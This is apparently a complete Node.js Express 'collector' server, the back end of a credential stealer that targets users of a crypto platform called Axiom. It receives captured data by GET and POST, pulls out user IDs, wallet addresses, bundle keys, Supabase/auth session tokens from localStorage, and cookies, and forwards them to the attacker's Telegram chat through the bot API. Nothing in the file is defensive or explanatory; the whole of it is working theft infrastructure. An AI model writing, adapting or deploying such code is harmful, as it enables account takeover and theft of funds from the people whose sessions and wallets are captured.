const express = require('express');
const app = express();
app.use(express.json({ limit: '1mb' }));

const TELEGRAM_TOKEN = 'YOUR_BOT_TOKEN';
const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';

async function sendTelegram(text) {
  const maxLen = 4000;
  for (let i = 0; i < text.length; i += maxLen) {
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: text.substring(i, i + maxLen),
          parse_mode: 'Markdown'
        })
      });
    } catch (e) {
      console.log('Telegram send failed:', e.message);
    }
  }
}

app.get('/data/:encoded', async (req, res) => {
  try {
    const decoded = JSON.parse(Buffer.from(req.params.encoded, 'base64').toString('utf-8'));
    console.log('===== NEW CAPTURE (GET) =====');
    console.log(JSON.stringify(decoded, null, 2));
    console.log('========================');
    await processCapture(decoded);
    res.send('ok');
  } catch (e) {
    console.log('Invalid data:', e.message);
    res.send('ok');
  }
});

app.post('/collect', async (req, res) => {
  try {
    const decoded = req.body;
    console.log('===== NEW CAPTURE (POST) =====');
    console.log(JSON.stringify(decoded, null, 2));
    console.log('========================');
    await processCapture(decoded);
    res.json({ status: 'ok' });
  } catch (e) {
    console.log('Invalid data:', e.message);
    res.json({ status: 'ok' });
  }
});

async function processCapture(d) {
  let msg = '🔑 *New Axiom Capture*\n\n';

  if (d.user) {
    msg += '*User ID:* `' + (d.user.userId || 'N/A') + '`\n';
    msg += '*Wallet:* `' + (d.user.registrationWallet || 'N/A') + '`\n';
  }

  if (d.bundle) msg += '*Bundle Key:* `' + d.bundle + '`\n';

  if (d.wallets && d.wallets.length > 0) {
    msg += '\n*Wallets:*\n';
    d.wallets.forEach((w, i) => {
      msg += '  ' + (i + 1) + '. `' + w.walletAddress + '` (' + w.network + ')\n';
    });
  }

  // Check localStorage for supabase token
  if (d.localStorage) {
    for (const key in d.localStorage) {
      if (key.includes('supabase') || key.includes('auth')) {
        msg += '\n🔐 *Session Token:* `' + key + '`\n```' + d.localStorage[key].substring(0, 1500) + '```\n';
      }
    }
  }

  if (d.cookies) {
    msg += '\n🍪 *Cookies:*\n```' + d.cookies.substring(0, 1000) + '```\n';
  }

  if (d.sBundles) msg += '\n📦 *sBundles:* `' + d.sBundles.substring(0, 200) + '...`\n';
  if (d.eBundles) msg += '\n📦 *eBundles:* `' + d.eBundles.substring(0, 200) + '...`\n';

  await sendTelegram(msg);
}

app.listen(10000, () => console.log('Collector running on port 10000'));
